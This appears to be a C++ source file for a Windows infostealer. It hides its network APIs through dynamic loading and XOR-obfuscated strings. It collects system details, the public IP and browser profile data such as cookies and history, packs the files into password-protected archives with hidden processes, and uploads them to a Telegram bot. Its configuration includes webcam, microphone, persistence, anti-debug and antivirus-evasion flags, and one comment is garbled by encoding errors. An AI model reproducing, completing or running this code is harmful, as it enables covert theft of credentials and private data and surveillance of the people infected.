#define WIN32_LEAN_AND_MEAN
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <winhttp.h>
#include <wincrypt.h>
#include <bcrypt.h>
#include <string>
#include <vector>
#include <thread>
#include <chrono>
#include <fstream>
#include <sstream>
#include <ctime>
#include <algorithm>
#include <map>
#include <iphlpapi.h>
#include <intrin.h>

// === Dynamic API loading — keeps suspicious DLLs out of IAT ===

typedef HINTERNET (WINAPI *pfnWinHttpOpen)(LPCWSTR,DWORD,LPCWSTR,LPCWSTR,DWORD);
typedef HINTERNET (WINAPI *pfnWinHttpConnect)(HINTERNET,LPCWSTR,INTERNET_PORT,DWORD);
typedef HINTERNET (WINAPI *pfnWinHttpOpenRequest)(HINTERNET,LPCWSTR,LPCWSTR,LPCWSTR,LPCWSTR,LPCWSTR*,DWORD);
typedef BOOL (WINAPI *pfnWinHttpSetTimeouts)(HINTERNET,int,int,int,int);
typedef BOOL (WINAPI *pfnWinHttpSendRequest)(HINTERNET,LPCWSTR,DWORD,LPVOID,DWORD,DWORD,DWORD_PTR);
typedef BOOL (WINAPI *pfnWinHttpReceiveResponse)(HINTERNET,LPVOID);
typedef BOOL (WINAPI *pfnWinHttpQueryDataAvailable)(HINTERNET,LPDWORD);
typedef BOOL (WINAPI *pfnWinHttpReadData)(HINTERNET,LPVOID,DWORD,LPDWORD);
typedef BOOL (WINAPI *pfnWinHttpQueryHeaders)(HINTERNET,DWORD,LPCWSTR,LPVOID,LPDWORD,LPDWORD);
typedef BOOL (WINAPI *pfnWinHttpCloseHandle)(HINTERNET);

typedef ULONG (WINAPI *pfnGetAdaptersAddresses)(ULONG,ULONG,PVOID,PIP_ADAPTER_ADDRESSES,PULONG);

struct DynApi {
    HMODULE hWinHttp = nullptr;
    pfnWinHttpOpen WinHttpOpen = nullptr;
    pfnWinHttpConnect WinHttpConnect = nullptr;
    pfnWinHttpOpenRequest WinHttpOpenRequest = nullptr;
    pfnWinHttpSetTimeouts WinHttpSetTimeouts = nullptr;
    pfnWinHttpSendRequest WinHttpSendRequest = nullptr;
    pfnWinHttpReceiveResponse WinHttpReceiveResponse = nullptr;
    pfnWinHttpQueryDataAvailable WinHttpQueryDataAvailable = nullptr;
    pfnWinHttpReadData WinHttpReadData = nullptr;
    pfnWinHttpQueryHeaders WinHttpQueryHeaders = nullptr;
    pfnWinHttpCloseHandle WinHttpCloseHandle = nullptr;

    HMODULE hIphlp = nullptr;
    pfnGetAdaptersAddresses GetAdaptersAddresses = nullptr;

    bool winHttpOk() const { return WinHttpOpen && WinHttpConnect && WinHttpOpenRequest && WinHttpSetTimeouts && WinHttpSendRequest && WinHttpReceiveResponse && WinHttpQueryDataAvailable && WinHttpReadData && WinHttpQueryHeaders && WinHttpCloseHandle; }
};

// dynApi() defined after OX macro below
#include <shlobj.h>
#include <gdiplus.h>
#include <mmsystem.h>
#include <vfw.h>
#include <tlhelp32.h>
#include <RestartManager.h>
#include <objbase.h>
#include <oleauto.h>
#include <cctype>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "gdiplus.lib")
#pragma comment(lib, "winmm.lib")
#pragma comment(lib, "vfw32.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "bcrypt.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "oleaut32.lib")
#pragma comment(lib, "advapi32.lib")

// === Compile-time string obfuscation (XOR) ===

template<int N, char Key>
struct ObfStr {
    char data[N];
    constexpr ObfStr(const char (&s)[N]) : data{} {
        for (int i = 0; i < N; i++) data[i] = s[i] ^ Key;
    }
};

template<int N, wchar_t Key>
struct ObfStrW {
    wchar_t data[N];
    constexpr ObfStrW(const wchar_t (&s)[N]) : data{} {
        for (int i = 0; i < N; i++) data[i] = s[i] ^ Key;
    }
};

#define OX(s) ([]() -> const char* { \
    constexpr auto ob = ObfStr<sizeof(s), 0x5C>(s); \
    static char dec[sizeof(s)]; \
    for (int i = 0; i < sizeof(s); i++) dec[i] = ob.data[i] ^ 0x5C; \
    return dec; }())

#define OXW(s) ([]() -> const wchar_t* { \
    constexpr auto ob = ObfStrW<sizeof(s) / sizeof(wchar_t), 0x5C>(s); \
    static wchar_t dec[sizeof(s) / sizeof(wchar_t)]; \
    for (int i = 0; i < sizeof(s) / sizeof(wchar_t); i++) dec[i] = ob.data[i] ^ 0x5C; \
    return dec; }())

static DynApi& dynApi() {
    static DynApi api;
    static bool tried = false;
    if (!tried) {
        tried = true;
        api.hWinHttp = LoadLibraryA(OX("winhttp.dll"));
        if (api.hWinHttp) {
            api.WinHttpOpen = (pfnWinHttpOpen)GetProcAddress(api.hWinHttp, OX("WinHttpOpen"));
            api.WinHttpConnect = (pfnWinHttpConnect)GetProcAddress(api.hWinHttp, OX("WinHttpConnect"));
            api.WinHttpOpenRequest = (pfnWinHttpOpenRequest)GetProcAddress(api.hWinHttp, OX("WinHttpOpenRequest"));
            api.WinHttpSetTimeouts = (pfnWinHttpSetTimeouts)GetProcAddress(api.hWinHttp, OX("WinHttpSetTimeouts"));
            api.WinHttpSendRequest = (pfnWinHttpSendRequest)GetProcAddress(api.hWinHttp, OX("WinHttpSendRequest"));
            api.WinHttpReceiveResponse = (pfnWinHttpReceiveResponse)GetProcAddress(api.hWinHttp, OX("WinHttpReceiveResponse"));
            api.WinHttpQueryDataAvailable = (pfnWinHttpQueryDataAvailable)GetProcAddress(api.hWinHttp, OX("WinHttpQueryDataAvailable"));
            api.WinHttpReadData = (pfnWinHttpReadData)GetProcAddress(api.hWinHttp, OX("WinHttpReadData"));
            api.WinHttpQueryHeaders = (pfnWinHttpQueryHeaders)GetProcAddress(api.hWinHttp, OX("WinHttpQueryHeaders"));
            api.WinHttpCloseHandle = (pfnWinHttpCloseHandle)GetProcAddress(api.hWinHttp, OX("WinHttpCloseHandle"));
        }
        api.hIphlp = LoadLibraryA(OX("iphlpapi.dll"));
        if (api.hIphlp) {
            api.GetAdaptersAddresses = (pfnGetAdaptersAddresses)GetProcAddress(api.hIphlp, OX("GetAdaptersAddresses"));
        }
    }
    return api;
}

// winsqlite3 (Windows 10+) loaded dynamically
typedef struct sqlite3 sqlite3;
typedef struct sqlite3_stmt sqlite3_stmt;
typedef int (*sqlite3_open_v2_t)(const char*, sqlite3**, int, const char*);
typedef int (*sqlite3_close_t)(sqlite3*);
typedef int (*sqlite3_prepare_v2_t)(sqlite3*, const char*, int, sqlite3_stmt**, const char**);
typedef int (*sqlite3_step_t)(sqlite3_stmt*);
typedef int (*sqlite3_finalize_t)(sqlite3_stmt*);
typedef const unsigned char* (*sqlite3_column_text_t)(sqlite3_stmt*, int);
typedef const void* (*sqlite3_column_blob_t)(sqlite3_stmt*, int);
typedef int (*sqlite3_column_bytes_t)(sqlite3_stmt*, int);
typedef int (*sqlite3_column_int_t)(sqlite3_stmt*, int);
#define SQLITE_OPEN_READONLY 0x00000001
#define SQLITE_OPEN_READWRITE 0x00000002
#define SQLITE_OK 0
#define SQLITE_ROW 100

struct SqliteApi {
    HMODULE mod = nullptr;
    sqlite3_open_v2_t open_v2 = nullptr;
    sqlite3_close_t close = nullptr;
    sqlite3_prepare_v2_t prepare_v2 = nullptr;
    sqlite3_step_t step = nullptr;
    sqlite3_finalize_t finalize = nullptr;
    sqlite3_column_text_t column_text = nullptr;
    sqlite3_column_blob_t column_blob = nullptr;
    sqlite3_column_bytes_t column_bytes = nullptr;
    sqlite3_column_int_t column_int = nullptr;
    bool ok() const { return mod && open_v2 && close && prepare_v2 && step && finalize && column_text; }
};

static SqliteApi& sqliteApi() {
    static SqliteApi api;
    static bool tried = false;
    if (!tried) {
        tried = true;
        api.mod = LoadLibraryA(OX("winsqlite3.dll"));
        if (api.mod) {
            api.open_v2 = (sqlite3_open_v2_t)GetProcAddress(api.mod, OX("sqlite3_open_v2"));
            api.close = (sqlite3_close_t)GetProcAddress(api.mod, OX("sqlite3_close"));
            api.prepare_v2 = (sqlite3_prepare_v2_t)GetProcAddress(api.mod, OX("sqlite3_prepare_v2"));
            api.step = (sqlite3_step_t)GetProcAddress(api.mod, OX("sqlite3_step"));
            api.finalize = (sqlite3_finalize_t)GetProcAddress(api.mod, OX("sqlite3_finalize"));
            api.column_text = (sqlite3_column_text_t)GetProcAddress(api.mod, OX("sqlite3_column_text"));
            api.column_blob = (sqlite3_column_blob_t)GetProcAddress(api.mod, OX("sqlite3_column_blob"));
            api.column_bytes = (sqlite3_column_bytes_t)GetProcAddress(api.mod, OX("sqlite3_column_bytes"));
            api.column_int = (sqlite3_column_int_t)GetProcAddress(api.mod, OX("sqlite3_column_int"));
        }
    }
    return api;
}

struct PayloadConfig {
    std::string botToken;
    std::string chatId;
    std::string sessionId;
    int updateIntervalDays = 0;
    bool grabBrowser = false;
    bool screenshot = false;
    bool autoStart = false;
    bool grabWebcam = false;
    bool grabMicrophone = false;
    bool bypassVT = false;
    bool stealth = false;
    bool persistence = false;
    bool antiDebug = false;
    bool encryptTraffic = false;
    bool antiAV = false;
    int micDurationSec = 10;
    int webcamDurationSec = 10;
    int screenDurationSec = 10;
};

static std::wstring s2ws(const std::string& s) {
    return std::wstring(s.begin(), s.end());
}

static std::string generatePassword() {
    static const char chars[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    std::string result;
    result.reserve(10);
    for (int i = 0; i < 10; i++)
        result += chars[(rand() + i) % (sizeof(chars) - 1)];
    return result;
}

static std::string urlEncode(const std::string& s) {
    std::string result;
    for (char c : s) {
        if ((c >= 'A' && c <= 'Z') || (c >= 'a' && c <= 'z') ||
            (c >= '0' && c <= '9') || c == '-' || c == '_' || c == '.' || c == '~') {
            result += c;
        } else {
            char buf[8];
            snprintf(buf, sizeof(buf), "%%%02X", (unsigned char)c);
            result += buf;
        }
    }
    return result;
}

// === HTTP ===

static void setHttpTimeouts(HINTERNET hSession) {
    auto& api = dynApi();
    if (!api.winHttpOk() || !api.WinHttpSetTimeouts) return;
    DWORD resolve = 10000, connect = 10000, send = 20000, receive = 30000;
    api.WinHttpSetTimeouts(hSession, resolve, connect, send, receive);
}

static bool httpPost(const std::string& path, const std::string& body, std::string& response) {
    auto& api = dynApi();
    if (!api.winHttpOk()) return false;

    HINTERNET hSession = api.WinHttpOpen(L"Mozilla/5.0",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) return false;
    setHttpTimeouts(hSession);

    HINTERNET hConnect = api.WinHttpConnect(hSession, OXW(L"api.telegram.org"), INTERNET_DEFAULT_HTTPS_PORT, 0);
    if (!hConnect) { api.WinHttpCloseHandle(hSession); return false; }

    std::wstring wpath = s2ws(path);
    HINTERNET hRequest = api.WinHttpOpenRequest(hConnect, OXW(L"POST"), wpath.c_str(),
        nullptr, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
    if (!hRequest) { api.WinHttpCloseHandle(hConnect); api.WinHttpCloseHandle(hSession); return false; }

    std::wstring headers = OXW(L"Content-Type: application/x-www-form-urlencoded\r\n");

    BOOL bResults = api.WinHttpSendRequest(hRequest, headers.c_str(), (DWORD)headers.size(),
        (LPVOID)body.c_str(), (DWORD)body.size(), (DWORD)body.size(), 0);

    if (bResults)
        bResults = api.WinHttpReceiveResponse(hRequest, nullptr);

    bool ok = false;
    if (bResults) {
        DWORD dwSize = 0;
        do {
            DWORD dwDownloaded = 0;
            if (!api.WinHttpQueryDataAvailable(hRequest, &dwSize)) break;
            if (dwSize == 0) break;
            char* buffer = new char[dwSize + 1];
            if (api.WinHttpReadData(hRequest, buffer, dwSize, &dwDownloaded)) {
                buffer[dwDownloaded] = 0;
                response += buffer;
            }
            delete[] buffer;
        } while (dwSize > 0);
        ok = !response.empty();
    }

    DWORD statusCode = 0;
    DWORD statusCodeSize = sizeof(statusCode);
    if (api.WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
        WINHTTP_HEADER_NAME_BY_INDEX, &statusCode, &statusCodeSize, WINHTTP_NO_HEADER_INDEX)) {
        ok = (statusCode == 200);
    }

    api.WinHttpCloseHandle(hRequest);
    api.WinHttpCloseHandle(hConnect);
    api.WinHttpCloseHandle(hSession);
    return ok;
}

static bool httpPostMultipart(const std::string& path, const std::string& contentType,
    const std::string& body, std::string& response) {
    auto& api = dynApi();
    if (!api.winHttpOk()) return false;

    HINTERNET hSession = api.WinHttpOpen(L"Mozilla/5.0",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) return false;
    setHttpTimeouts(hSession);

    HINTERNET hConnect = api.WinHttpConnect(hSession, OXW(L"api.telegram.org"), INTERNET_DEFAULT_HTTPS_PORT, 0);
    if (!hConnect) { api.WinHttpCloseHandle(hSession); return false; }

    std::wstring wpath = s2ws(path);
    HINTERNET hRequest = api.WinHttpOpenRequest(hConnect, OXW(L"POST"), wpath.c_str(),
        nullptr, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
    if (!hRequest) { api.WinHttpCloseHandle(hConnect); api.WinHttpCloseHandle(hSession); return false; }

    std::wstring headers = OXW(L"Content-Type: ") + s2ws(contentType) + OXW(L"\r\n");

    BOOL bResults = api.WinHttpSendRequest(hRequest, headers.c_str(), (DWORD)headers.size(),
        (LPVOID)body.c_str(), (DWORD)body.size(), (DWORD)body.size(), 0);

    if (bResults)
        bResults = api.WinHttpReceiveResponse(hRequest, nullptr);

    bool ok = false;
    if (bResults) {
        DWORD dwSize = 0;
        do {
            DWORD dwDownloaded = 0;
            if (!api.WinHttpQueryDataAvailable(hRequest, &dwSize)) break;
            if (dwSize == 0) break;
            char* buffer = new char[dwSize + 1];
            if (api.WinHttpReadData(hRequest, buffer, dwSize, &dwDownloaded)) {
                buffer[dwDownloaded] = 0;
                response += buffer;
            }
            delete[] buffer;
        } while (dwSize > 0);
        ok = !response.empty();
    }

    DWORD statusCode = 0;
    DWORD statusCodeSize = sizeof(statusCode);
    if (api.WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
        WINHTTP_HEADER_NAME_BY_INDEX, &statusCode, &statusCodeSize, WINHTTP_NO_HEADER_INDEX)) {
        ok = (statusCode == 200);
    }

    api.WinHttpCloseHandle(hRequest);
    api.WinHttpCloseHandle(hConnect);
    api.WinHttpCloseHandle(hSession);
    return ok;
}

static std::string httpGet(const std::string& host, const std::string& path) {
    std::string result;
    auto& api = dynApi();
    if (!api.winHttpOk()) return result;

    HINTERNET hSession = api.WinHttpOpen(L"Mozilla/5.0",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) return result;
    setHttpTimeouts(hSession);

    std::wstring whost = s2ws(host);
    HINTERNET hConnect = api.WinHttpConnect(hSession, whost.c_str(), INTERNET_DEFAULT_HTTPS_PORT, 0);
    if (!hConnect) { api.WinHttpCloseHandle(hSession); return result; }

    std::wstring wpath = s2ws(path);
    HINTERNET hRequest = api.WinHttpOpenRequest(hConnect, L"GET", wpath.c_str(),
        nullptr, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
    if (!hRequest) { api.WinHttpCloseHandle(hConnect); api.WinHttpCloseHandle(hSession); return result; }

    BOOL bResults = api.WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
        WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
    if (bResults)
        bResults = api.WinHttpReceiveResponse(hRequest, nullptr);

    if (bResults) {
        DWORD dwSize = 0;
        do {
            DWORD dwDownloaded = 0;
            if (!api.WinHttpQueryDataAvailable(hRequest, &dwSize)) break;
            if (dwSize == 0) break;
            char* buffer = new char[dwSize + 1];
            if (api.WinHttpReadData(hRequest, buffer, dwSize, &dwDownloaded)) {
                buffer[dwDownloaded] = 0;
                result += buffer;
            }
            delete[] buffer;
        } while (dwSize > 0);
    }

    api.WinHttpCloseHandle(hRequest);
    api.WinHttpCloseHandle(hConnect);
    api.WinHttpCloseHandle(hSession);
    return result;
}

static void sendTelegram(const PayloadConfig& cfg, const std::string& message) {
    std::string path = "/bot" + cfg.botToken + "/sendMessage";
    std::string body = "chat_id=" + urlEncode(cfg.chatId) + "&text=" + urlEncode(message);
    std::string response;
    httpPost(path, body, response);
}

static void sendDocument(const PayloadConfig& cfg, const std::string& caption,
    const std::string& fileName, const std::vector<char>& fileData) {
    std::string path = "/bot" + cfg.botToken + "/sendDocument";
    std::string boundary = "----P" + std::to_string(GetTickCount());
    std::string body;

    body += "--" + boundary + "\r\n";
    body += "Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n";
    body += cfg.chatId + "\r\n";

    body += "--" + boundary + "\r\n";
    body += "Content-Disposition: form-data; name=\"caption\"\r\n\r\n";
    body += caption + "\r\n";

    body += "--" + boundary + "\r\n";
    body += "Content-Disposition: form-data; name=\"document\"; filename=\"" + fileName + "\"\r\n";
    body += "Content-Type: application/octet-stream\r\n\r\n";
    body.append(fileData.begin(), fileData.end());
    body += "\r\n";
    body += "--" + boundary + "--\r\n";

    std::string contentType = "multipart/form-data; boundary=" + boundary;
    std::string response;
    httpPostMultipart(path, contentType, body, response);
}

// === System info ===

static std::string getPCName() {
    char name[MAX_COMPUTERNAME_LENGTH + 1] = "";
    DWORD size = sizeof(name);
    GetComputerNameA(name, &size);
    return std::string(name);
}

static std::string getPublicIP() {
    std::string resp = httpGet(OX("api.ipify.org"), OX("/"));
    if (resp.empty())
        resp = httpGet(OX("ifconfig.me"), OX("/"));
    if (resp.empty())
        return "Unknown";
    size_t start = resp.find_first_of("0123456789");
    if (start == std::string::npos) return "Unknown";
    size_t end = resp.find_first_not_of("0123456789.", start);
    if (end == std::string::npos) end = resp.size();
    return resp.substr(start, end - start);
}

static std::string getCPU() {
    int cpuInfo[4] = { 0 };
    __cpuid(cpuInfo, 0);
    char brand[49] = { 0 };
    __cpuid(cpuInfo, 0x80000002);
    memcpy(brand, cpuInfo, sizeof(cpuInfo));
    __cpuid(cpuInfo, 0x80000003);
    memcpy(brand + 16, cpuInfo, sizeof(cpuInfo));
    __cpuid(cpuInfo, 0x80000004);
    memcpy(brand + 32, cpuInfo, sizeof(cpuInfo));
    brand[48] = 0;
    std::string result(brand);
    size_t start = result.find_first_not_of(" \t");
    if (start != std::string::npos)
        result = result.substr(start);
    return result.empty() ? "Unknown" : result;
}

static std::string getGPU() {
    DISPLAY_DEVICEA dd;
    dd.cb = sizeof(dd);
    if (EnumDisplayDevicesA(nullptr, 0, &dd, 0)) {
        std::string name(dd.DeviceString);
        if (!name.empty())
            return name;
    }
    return "Unknown";
}

static std::string getExeName() {
    char path[MAX_PATH];
    GetModuleFileNameA(nullptr, path, MAX_PATH);
    const char* name = strrchr(path, '\\');
    return name ? std::string(name + 1) : std::string(path);
}

static std::string getCurrentDate() {
    std::time_t now = std::time(nullptr);
    std::tm localTime;
    localtime_s(&localTime, &now);
    char buf[32];
    std::strftime(buf, sizeof(buf), "%d-%m-%Y %H:%M", &localTime);
    return std::string(buf);
}

static std::string getTempDir() {
    char tempPath[MAX_PATH];
    GetTempPathA(MAX_PATH, tempPath);
    return std::string(tempPath);
}

static std::vector<char> readFileToVector(const std::string& path) {
    std::vector<char> data;
    std::ifstream file(path, std::ios::binary);
    if (file.is_open()) {
        file.seekg(0, std::ios::end);
        std::streampos size = file.tellg();
        file.seekg(0, std::ios::beg);
        if (size > 0) {
            data.resize(static_cast<size_t>(size));
            file.read(data.data(), size);
        }
        file.close();
    }
    return data;
}

static bool writeVectorToFile(const std::string& path, const std::vector<char>& data) {
    std::ofstream file(path, std::ios::binary);
    if (!file.is_open()) return false;
    file.write(data.data(), data.size());
    file.close();
    return true;
}

// === Archive creation using WinRAR / 7z / PowerShell ===

static bool runProcessHidden(const std::string& cmdLine, const std::string& workDir = "") {
    STARTUPINFOA si = {};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    PROCESS_INFORMATION pi = {};

    char* cmd = _strdup(cmdLine.c_str());
    const char* cwd = workDir.empty() ? nullptr : workDir.c_str();
    BOOL ok = CreateProcessA(nullptr, cmd, nullptr, nullptr, FALSE, CREATE_NO_WINDOW, nullptr, cwd, &si, &pi);
    free(cmd);

    if (!ok) return false;

    WaitForSingleObject(pi.hProcess, 120000);
    DWORD exitCode = 1;
    GetExitCodeProcess(pi.hProcess, &exitCode);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    return (exitCode == 0);
}

static void deleteTree(const std::string& path) {
    WIN32_FIND_DATAA findData;
    HANDLE hFind = FindFirstFileA((path + "\\*").c_str(), &findData);
    if (hFind == INVALID_HANDLE_VALUE) {
        RemoveDirectoryA(path.c_str());
        DeleteFileA(path.c_str());
        return;
    }
    do {
        std::string name = findData.cFileName;
        if (name == "." || name == "..") continue;
        std::string full = path + "\\" + name;
        if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
            deleteTree(full);
        else
            DeleteFileA(full.c_str());
    } while (FindNextFileA(hFind, &findData));
    FindClose(hFind);
    RemoveDirectoryA(path.c_str());
}

static std::vector<char> createArchive(const std::vector<std::pair<std::string, std::vector<char>>>& files,
    std::string& outExtension, const std::string& password) {
    std::vector<char> result;
    outExtension = "zip";

    std::string tempDir = getTempDir() + "tmp_" + std::to_string(GetTickCount());
    CreateDirectoryA(tempDir.c_str(), nullptr);

    for (auto& f : files) {
        if (f.second.empty()) continue;
        std::string rel = f.first;
        for (char& c : rel) if (c == '/') c = '\\';
        std::string filePath = tempDir + "\\" + rel;
        size_t slash = filePath.rfind('\\');
        if (slash != std::string::npos)
            SHCreateDirectoryExA(nullptr, filePath.substr(0, slash).c_str(), nullptr);
        std::ofstream file(filePath, std::ios::binary);
        if (file.is_open()) {
            file.write(f.second.data(), (std::streamsize)f.second.size());
            file.close();
        }
    }

    std::string archiveBase = getTempDir() + "data_" + std::to_string(GetTickCount());
    bool archiveCreated = false;

    // Archive FROM inside tempDir so folder names (browser_data, webcam, ...) are preserved.
    // Never use WinRAR -ep (it strips all paths).
    std::vector<std::string> rarPaths = {
        "C:\\Program Files\\WinRAR\\rar.exe",
        "C:\\Program Files (x86)\\WinRAR\\rar.exe"
    };
    for (auto& rar : rarPaths) {
        if (GetFileAttributesA(rar.c_str()) != INVALID_FILE_ATTRIBUTES) {
            std::string outRar = archiveBase + ".rar";
            std::string cmd = "\"" + rar + "\" a -r -ep1 -p\"" + password + "\" \"" + outRar + "\" *";
            if (runProcessHidden(cmd, tempDir)) {
                outExtension = "rar";
                archiveCreated = true;
                break;
            }
        }
    }

    if (!archiveCreated) {
        std::vector<std::string> sevenZipPaths = {
            "C:\\Program Files\\7-Zip\\7z.exe",
            "C:\\Program Files (x86)\\7-Zip\\7z.exe"
        };
        for (auto& sz : sevenZipPaths) {
            if (GetFileAttributesA(sz.c_str()) != INVALID_FILE_ATTRIBUTES) {
                std::string outZip = archiveBase + ".zip";
                std::string cmd = "\"" + sz + "\" a -r -p\"" + password + "\" -mhe=off \"" + outZip + "\" *";
                if (runProcessHidden(cmd, tempDir)) {
                    outExtension = "zip";
                    archiveCreated = true;
                    break;
                }
            }
        }
    }

    if (!archiveCreated) {
        std::string outZip = archiveBase + ".zip";
        std::string cmd = "powershell -NoProfile -WindowStyle Hidden -Command \"Compress-Archive -Path * -DestinationPath '" + outZip + "' -Force\"";
        if (runProcessHidden(cmd, tempDir)) {
            outExtension = "zip";
            archiveCreated = true;
        }
    }

    if (archiveCreated) {
        std::string archivePath = archiveBase + "." + outExtension;
        result = readFileToVector(archivePath);
        DeleteFileA(archivePath.c_str());
    }

    deleteTree(tempDir);
    return result;
}

// === Feature: Grab browser data ===

static bool pathExists(const std::string& path) {
    return GetFileAttributesA(path.c_str()) != INVALID_FILE_ATTRIBUTES;
}

static std::string firstExistingPath(const std::vector<std::string>& paths) {
    for (const auto& p : paths) {
        if (pathExists(p))
            return p;
    }
    return paths.empty() ? std::string() : paths.front();
}

static std::string getDefaultBrowserName() {
    HKEY hKey;
    char buf[MAX_PATH] = "";
    DWORD bufSize = sizeof(buf);
    DWORD type = 0;

    if (RegOpenKeyExA(HKEY_CURRENT_USER,
        "Software\\Microsoft\\Windows\\Shell\\Associations\\UrlAssociations\\http\\UserChoice",
        0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        if (RegQueryValueExA(hKey, "ProgId", nullptr, &type, (BYTE*)buf, &bufSize) != ERROR_SUCCESS)
            buf[0] = 0;
        RegCloseKey(hKey);
    }

    if (buf[0] == 0) {
        if (RegOpenKeyExA(HKEY_CURRENT_USER,
            "Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FileExts\\.html\\UserChoice",
            0, KEY_READ, &hKey) == ERROR_SUCCESS) {
            bufSize = sizeof(buf);
            if (RegQueryValueExA(hKey, "ProgId", nullptr, &type, (BYTE*)buf, &bufSize) != ERROR_SUCCESS)
                buf[0] = 0;
            RegCloseKey(hKey);
        }
    }

    if (buf[0] == 0) {
        if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Classes\\http\\shell\\open\\command",
            0, KEY_READ, &hKey) == ERROR_SUCCESS) {
            bufSize = sizeof(buf);
            if (RegQueryValueExA(hKey, nullptr, nullptr, &type, (BYTE*)buf, &bufSize) != ERROR_SUCCESS)
                buf[0] = 0;
            RegCloseKey(hKey);
        }
    }

    std::string progId(buf);
    std::transform(progId.begin(), progId.end(), progId.begin(), ::tolower);

    char localAppData[MAX_PATH] = {};
    char roamingAppData[MAX_PATH] = {};
    SHGetFolderPathA(nullptr, CSIDL_LOCAL_APPDATA, nullptr, 0, localAppData);
    SHGetFolderPathA(nullptr, CSIDL_APPDATA, nullptr, 0, roamingAppData);

    // Opera GX shares ProgId with Opera ("OperaStable") Ä‚â€žĂ˘â‚¬ĹˇÄ‚â€ąĂ‚ÂĂ„â€šĂ‹ÂÄ‚ËĂ˘â€šÂ¬ÄąË‡Ä‚â€šĂ‚Â¬Ă„â€šĂ‹ÂÄ‚ËĂ˘â‚¬ĹˇĂ‚Â¬Ă„Ä…Ă„â€ž distinguish by profile folder / install path
    auto isOperaGxInstalled = [&]() -> bool {
        return pathExists(std::string(roamingAppData) + "\\Opera Software\\Opera GX Stable") ||
               pathExists(std::string(localAppData) + "\\Opera Software\\Opera GX Stable") ||
               progId.find("gx") != std::string::npos ||
               progId.find("launcher") != std::string::npos;
    };

    if (progId.find("chrome") != std::string::npos || progId.find("chromium") != std::string::npos)
        return "Chrome";
    if (progId.find("msedge") != std::string::npos || progId.find("edge") != std::string::npos)
        return "Edge";
    if (progId.find("firefox") != std::string::npos || progId.find("mozilla") != std::string::npos)
        return "Firefox";
    if (progId.find("brave") != std::string::npos)
        return "Brave";
    if (progId.find("opera") != std::string::npos) {
        if (isOperaGxInstalled())
            return "Opera GX";
        return "Opera";
    }

    // If no ProgId match, prefer installed browser with profile data
    if (pathExists(std::string(roamingAppData) + "\\Opera Software\\Opera GX Stable") ||
        pathExists(std::string(localAppData) + "\\Opera Software\\Opera GX Stable"))
        return "Opera GX";
    if (pathExists(std::string(localAppData) + "\\Google\\Chrome\\User Data\\Default"))
        return "Chrome";
    if (pathExists(std::string(localAppData) + "\\Microsoft\\Edge\\User Data\\Default"))
        return "Edge";

    return "Chrome";
}

static std::string getBrowserUserDataRoot(const std::string& browser) {
    char localAppData[MAX_PATH] = {};
    char roamingAppData[MAX_PATH] = {};
    SHGetFolderPathA(nullptr, CSIDL_LOCAL_APPDATA, nullptr, 0, localAppData);
    SHGetFolderPathA(nullptr, CSIDL_APPDATA, nullptr, 0, roamingAppData);

    if (browser == "Chrome")
        return std::string(localAppData) + "\\Google\\Chrome\\User Data";
    if (browser == "Edge")
        return std::string(localAppData) + "\\Microsoft\\Edge\\User Data";
    if (browser == "Brave")
        return std::string(localAppData) + "\\BraveSoftware\\Brave-Browser\\User Data";
    if (browser == "Firefox")
        return std::string(roamingAppData) + "\\Mozilla\\Firefox\\Profiles";
    if (browser == "Opera GX") {
        return firstExistingPath({
            std::string(roamingAppData) + "\\Opera Software\\Opera GX Stable",
            std::string(localAppData) + "\\Opera Software\\Opera GX Stable"
        });
    }
    if (browser == "Opera") {
        return firstExistingPath({
            std::string(roamingAppData) + "\\Opera Software\\Opera Stable",
            std::string(localAppData) + "\\Opera Software\\Opera Stable"
        });
    }
    return std::string(localAppData) + "\\Google\\Chrome\\User Data";
}

// Profile folder with cookies/history. Opera stores Local State in root and data in Default.
static std::string getBrowserProfilePath(const std::string& browser) {
    std::string root = getBrowserUserDataRoot(browser);
    if (browser == "Firefox")
        return root;
    std::string def = root + "\\Default";
    if (pathExists(def))
        return def;
    return root;
}

static void enablePrivilege(const char* name) {
    HANDLE hToken = nullptr;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
        return;
    TOKEN_PRIVILEGES tp = {};
    if (LookupPrivilegeValueA(nullptr, name, &tp.Privileges[0].Luid)) {
        tp.PrivilegeCount = 1;
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
        AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), nullptr, nullptr);
    }
    CloseHandle(hToken);
}

